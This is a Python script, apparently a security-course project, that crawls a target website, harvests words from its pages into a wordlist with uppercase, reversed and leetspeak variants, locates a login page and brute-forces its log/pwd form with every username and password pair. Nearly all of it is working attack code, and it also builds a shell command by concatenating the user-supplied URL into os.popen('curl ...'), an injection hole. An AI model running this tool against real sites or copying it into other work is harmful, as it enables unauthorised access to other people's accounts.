import re
import sys
import socket
from bs4 import BeautifulSoup;
from urllib.parse import urljoin
from urllib.parse import urlsplit
from urllib.parse import urlparse
import os
import collections;

def check_error(response):
    errorcode=response[9]
#     print("Status Code: " + errorcode + "00")
    if (errorcode == "4" or errorcode == "5"):
        return("ERROR")
    else:
        return response

def prepare_useragent(useragent):
    if (useragent is not None):
        return useragent
    else:
        return None
        
def prepare_method(method):
#     """Prepares the given HTTP method."""
    if method is not None and method == "POST" or method == "GET":
        return(method)
    else: 
        return None

def requestWrapper(method,url,content=None,useragent=None,body=None):
    if (method is not None):
        a = method
        b = " " + urlparse(url).path + " HTTP/1.1\r\n"
        if (url is not None):
            c = "Host: " + urlsplit(url)[1].split(':')[0] + "\r\n"
            if(prepare_useragent(useragent)is not None):
                d = "User-Agent: "+ useragent + "\r\n"
                if (content is None or body is None):
                    return (a+b+c+d + "\r\n").encode('utf8')
                e = "Content-Type: " + content + "\r\n"
                content_length=len(body)
                f = "Content-Length: "+ str(content_length) + "\r\n"
                body_bytes = body.encode('ascii')
                return (a+b+c+d+e+f + "\r\n").encode('utf8')+body_bytes
            else:
                if (content is None or body is None):
                    return (a+b+c + "\r\n").encode('utf8')
                d = "Content-Type: " + content + "\r\n"
                content_length=len(body)
                e = "Content-Length: "+ str(content_length) + "\r\n"
                body_bytes = body.encode('ascii')
                return (a+b+c+d+e +"\r\n").encode('utf8')+body_bytes
        else:
            return "ERROR"

def request(r, url):
    if(r is not None):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((url, 80))
        s.send(r)
        while True:
            data = s.recv(250000)
            if ( len(data) < 1 ) :
                break
            return(check_error(data.decode('utf8')))
    except Exception as e:
            print("FATAL ERROR REQUEST FAILED")
            return "ERROR"
#             print(e)

def leetconv(word):
    result = ""
    for char in word:
            if char == 'a' or char == 'A':
                    result += '4'
            elif char == 'e' or char == 'E':
                    result += '3'
            elif char == 'l' or char == 'L':
                    result += '1'
            elif char == 't' or char =='T':
                    result += '7'
            elif char == 'o' or char == 'O':
                    result += '0'
            else:
                    result += char
    return result

def tokenize(url):
    wordlist = []
    domain = urlsplit(url)[1].split(':')[0]
    page = request(requestWrapper("GET", url, None, user_agent, None), domain)
    if(page is not "ERROR"):
        _,page = page.split("\r\n\r\n",1)
    else:
        return wordlist
    soup = BeautifulSoup(page, 'html.parser')

    for script in soup(["script", "style"]):
        script.extract()
    text = soup.get_text()
    lines = (line.strip() for line in text.splitlines())
    chunks = (phrase.strip() for line in lines for phrase in line.split("  "))
    text = ' '.join(chunk for chunk in chunks if chunk)
    regex = re.compile('[^a-zA-Z0-9_]')
    text = text.split()
    
    upper = []
    lower = []
    reverse = []
    l33t = []
    
    #prunes each word and does case conversions
    for word in text:
        new = regex.sub('', word)
        if new != '' and new not in wordlist:
            wordlist.append(new)
            upper.append(new.upper())
            lower.append(new.lower())
            reverse.append(new[::-1])
            l33t.append(leetconv(new))
    wordlist = wordlist + upper + lower + reverse + l33t
    wordcount = len(wordlist)
    return wordlist

def login(found,user,pw,link):
        #for user agent
        #body = log=user&pwd=passw
        body = "log="+user+"&pwd="+pw
        domain = urlsplit(link)[1].split(':')[0]
        
        r = request(requestWrapper("POST", link,"application/x-www-form-urlencoded", user_agent,body), domain)

        h,r = r.split("\r\n\r\n",1)
        
        if "200" not in h:
            found = True;
        

        #file1 = open('temp.html','w')
        #file1.writelines(str(r))
        #file1.close()
        #file1 = open('temp.html','r')
        #file1.close() h

        return found

def bruteforce(wordlist,loginurl):

    print("\n====================================")
    print("Bruteforcing >>> Username::Password")
    print("======================================")
    for user in wordlist:
        for pw in wordlist:
            print(user,"::",pw)
            found = False
            if login(found,user,pw,loginurl):
                print("\n-------------------------------------------------------------\n")
                print("Login successful\n\nUsername = ",user, 'and Pass = ',pw)
                print("-------------------------------------------------------------\n")
                sys.exit(0)
	
    print("Sorry, brute force was not successful\n")
	#os.remove("temp.html")

# INPUT OPTIONS
# ask for starting URL
# ask for maximum crawl limit
# ask for Depth or Breadth-first option for crawl
# if depth-first chosen ask for MAX depth of pages to crawl
url = input("Enter the starting URL including http:// ... ")
algorithm = input("Enter DFS or BFS: ").lower()
if(algorithm == "bfs"):
    MAX_CRAWL_LIMIT = int(input("Enter Maximum number of pages to crawl: "));
else:
    MAX_CRAWL_LIMIT = int(input("Enter Maximum depth limit of the crawl: "));
user_agent = input("Enter User-Agent: ");
# create queue for BFS
queue = collections.deque([]) 
#create stack for DFS
stack = []
# maintain visit pages
visited = []

# get the domain so we restrict our crawl to just the domain
domain = urlsplit(url)[1].split(':')[0]

# open subdomain.txt file and create subdomain list
subdomains = []
fo = open("subdomains.txt", "r")
for line in fo:
    subdomains.append(line)

# go through the robots.txt file to add to the queue of urls to visit
robot_url = "curl " + url + "robots.txt"
parse = os.popen(robot_url).readlines()
robot_sites = []
user_agent_trigger = 0;

# go through all the lines in the robot.txt
# skip first line since that is user agent
# append every other link into the queue
for line in parse:
    if(user_agent_trigger == 0):
        user_agent_trigger = 1
        continue
    else:
        # append the base url given with the last element removed (a whitespace)
        # concatinate that to the ending of the url found from robots.txt
        # while also removing the last element (a new line character 
        queue.append((url[:-1] + line.split(': ')[1])[:-1])
        stack.append((url[:-1] + line.split(': ')[1])[:-1])

# add the common subdomains conntinated with http:// format to the queue
# before the recursion because they dont need to get added every time the 
# recursion loop runs
# catch any error if the page does not exist and print invalid subdomain

# invalid_sub = []

# for l in subdomains:
#     m = "http://" + l[:-1] + "." + domain.rstrip('/')
#     try:
#         domain = urlsplit(m)[1].split(':')[0]
#         dummy = request(requestWrapper("GET", m, None, user_agent, None), domain)
#         queue.append(m)
#         stack.append(m)
#     except Exception :
#        invalid_sub.append(l[:-1])
       
# print ("======================")
# print ("  Invalid Subdomains: ")
# print ("======================")
# for i in invalid_sub:
#     print(i)
print ("\n")
print ("=================================================================")
print ("  This may take a moment to crawl............................... ")
print ("=================================================================")

def bfs_crawler(url):
    visited.append(url)
    
    # return if the queue is empty
    if len(queue) == 0:
        return
    
    # return if the total pages crawled(visited) is equal to or greater 
    # then MAX_CRAWL_LIMIT
    if len(visited) >= MAX_CRAWL_LIMIT:
        return
    
    domain = urlsplit(url)[1].split(':')[0]
#     print(domain)
    reqString = requestWrapper("GET", url, None, user_agent, None)
    req = request(reqString, domain)
    if(req is not "ERROR"):
        _,requ = req.split("\r\n\r\n",1)
    else:
        curr = queue.popleft()
        bfs_crawler(curr)
        return
    soup = BeautifulSoup(requ, 'html.parser')
    
    
    # create url seed list from a natural scrape of the url
    url_seed = []
    for link in soup.find_all('a'):
        s = link.get('href')
        
        url_seed.append(s)


    for i in url_seed:
        visited_trig = 0
        
        # strip away the trailing '/' for the url then join to original url
        full_url = urljoin(url, i.rstrip('/'))

        # check to see if the webiste already is in the queue    
        for j in queue:
            if j == full_url:
                visited_trig = 1
                break
            
        # if the webiste is not found in the queue
        if visited_trig == 0:
            if len(visited) >= MAX_CRAWL_LIMIT:
                return
            if(visited.count(full_url)) == 0:
                domain_tmp = urlsplit(full_url)[1].split(':')[0]
                
                # queue only if the domain is the same as the domain in 
                # original url
                if domain_tmp == domain:   
                    queue.append(full_url)
                
    curr = queue.popleft()
    bfs_crawler(curr)
    
def dfs_crawler(url):
    visited.append(url)
    
    # return if the queue is empty
    if len(stack) == 0:
        return
    
    # return if the total pages crawled(visited) is equal to or greater 
    # then MAX_CRAWL_LIMIT
    if len(visited) >= MAX_CRAWL_LIMIT:
        return
    
    domain = urlsplit(url)[1].split(':')[0]
    reqString = request(requestWrapper("GET", url, None, user_agent, None), domain)
    if(reqString is not "ERROR"):
        _,req = reqString.split("\r\n\r\n",1)
    else:
        curr = stack.pop()
        dfs_crawler(curr)
        return
    soup = BeautifulSoup(req, 'html.parser')
    
    
    # create url seed list from a natural scrape of the url
    url_seed = []
    for link in soup.find_all('a'):
        s = link.get('href')
        
        url_seed.append(s)


    for i in url_seed:
        visited_trig = 0
        
        # strip away the trailing '/' for the url then join to original url
        full_url = urljoin(url, i.rstrip('/'))

        # check to see if the webiste already is in the stack    
        for j in stack:
            if j == full_url:
                visited_trig = 1
                break
            
        # if the webiste is not found in the queue
        if visited_trig == 0:
            if len(visited) >= MAX_CRAWL_LIMIT:
                return
            if(visited.count(full_url)) == 0:
                domain_tmp = urlsplit(full_url)[1].split(':')[0]
                
                # queue only if the domain is the same as the domain in 
                # original url
                if domain_tmp == domain:   
                    stack.append(full_url)
                
    curr = stack.pop()
    dfs_crawler(curr)
    
# runs bfs or dfs
if algorithm == "bfs":
    bfs_crawler(url)
elif algorithm == "dfs":
    dfs_crawler(url)
else:
    print("Invalid Algorithm, only bfs and dfs are permitted")


# Print list of visited pages
print ("\n")
print ("=================================================================")
print ("----------------------- Pages Crawled ---------------------------")
print ("=================================================================")

master = []
login_page = ""
for i in visited:
    print (i)
    if i.find('login') != -1:
    	login_page = i
    if (i!= None):
        master += tokenize(i)

#print("login page: ", login)		
if(login_page == ""):
	print("No login page found, bruteforcer cancelled.")
else:
    print("login: ", login_page)
    bruteforce(master, login_page)